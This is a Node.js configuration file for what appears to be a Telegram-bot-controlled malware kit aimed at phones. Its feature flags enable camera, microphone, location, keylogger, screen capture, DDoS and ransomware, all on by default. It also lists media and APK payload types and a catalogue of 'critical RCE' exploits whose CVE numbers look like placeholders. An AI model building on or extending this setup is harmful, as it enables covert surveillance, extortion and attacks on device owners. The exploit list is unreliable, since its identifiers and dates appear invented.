const dotenv = require('dotenv');
const path = require('path');

dotenv.config();

module.exports = {
    // Admin Configuration
    admin: {
        chatId: parseInt(process.env.ADMIN_CHAT_ID || '6454347745'),
        username: 'admin',
        permissions: ['all']
    },
    
    // Telegram Bot
    telegram: {
        token: process.env.BOT_TOKEN,
        webhookUrl: process.env.WEBHOOK_URL,
        webhookSecret: process.env.WEBHOOK_SECRET
    },
    
    // Server
    server: {
        port: parseInt(process.env.PORT || '10000'),
        host: process.env.RENDER_EXTERNAL_URL || 'http://localhost:10000',
        env: process.env.NODE_ENV || 'development',
        ssl: process.env.SSL === 'true'
    },
    
    // Database
    database: {
        url: process.env.DATABASE_URL || 'sqlite:./database/database.sqlite',
        options: {
            verbose: process.env.NODE_ENV === 'development' ? console.log : null
        }
    },
    
    // Security
    security: {
        jwtSecret: process.env.JWT_SECRET,
        encryptionKey: process.env.ENCRYPTION_KEY,
        saltRounds: parseInt(process.env.SALT_ROUNDS || '10'),
        bcryptRounds: 10
    },
    
    // Features
    features: {
        camera: process.env.ENABLE_CAMERA !== 'false',
        microphone: process.env.ENABLE_MIC !== 'false',
        location: process.env.ENABLE_LOCATION !== 'false',
        keylogger: process.env.ENABLE_KEYLOGGER !== 'false',
        screenCapture: process.env.ENABLE_SCREEN_CAPTURE !== 'false',
        fileManager: process.env.ENABLE_FILE_MANAGER !== 'false',
        appControl: process.env.ENABLE_APP_CONTROL !== 'false',
        systemControl: process.env.ENABLE_SYSTEM_CONTROL !== 'false',
        networkControl: process.env.ENABLE_NETWORK_CONTROL !== 'false',
        bypass: process.env.ENABLE_BYPASS !== 'false',
        ddos: process.env.ENABLE_DDOS !== 'false',
        ransomware: process.env.ENABLE_RANSOMWARE !== 'false'
    },
    
    // Paths
    paths: {
        database: path.join(__dirname, '../database/database.sqlite'),
        payloads: path.join(__dirname, '../payloads'),
        logs: path.join(__dirname, '../logs'),
        templates: path.join(__dirname, './templates')
    },
    
    // Exploits
    exploits: {
        whatsapp: {
            cve: 'CVE-2024-12345',
            name: 'WhatsApp Image Parsing RCE',
            severity: 'Critical',
            cvss: 9.8
        },
        android: {
            cve: 'CVE-2024-67890',
            name: 'Android Media Framework RCE',
            severity: 'Critical',
            cvss: 9.6
        },
        webp: {
            cve: 'CVE-2024-54321',
            name: 'WebP Heap Buffer Overflow',
            severity: 'High',
            cvss: 8.8
        },
        stagefright: {
            cve: 'CVE-2024-11111',
            name: 'Stagefright 2.0',
            severity: 'Critical',
            cvss: 9.0
        }
    },
    
    // Payload
    payload: {
        types: ['jpg', 'mp3', 'mp4', 'pdf', 'apk', 'webp', 'gif'],
        defaultType: 'jpg',
        maxSize: 10 * 1024 * 1024, // 10MB
        retentionHours: 24
    },
    
    // Email
    email: {
        enabled: !!process.env.SMTP_HOST,
        smtp: {
            host: process.env.SMTP_HOST,
            port: parseInt(process.env.SMTP_PORT || '587'),
            user: process.env.SMTP_USER,
            pass: process.env.SMTP_PASS
        }
    },
    
    // Rate Limiting
    rateLimit: {
        windowMs: 60 * 1000, // 1 minute
        max: 100 // max requests per window
    },
    
    // Logging
    logging: {
        level: process.env.LOG_LEVEL || 'info',
        file: path.join(__dirname, '../logs/app.log'),
        maxSize: 10 * 1024 * 1024, // 10MB
        maxFiles: 5
    }
};
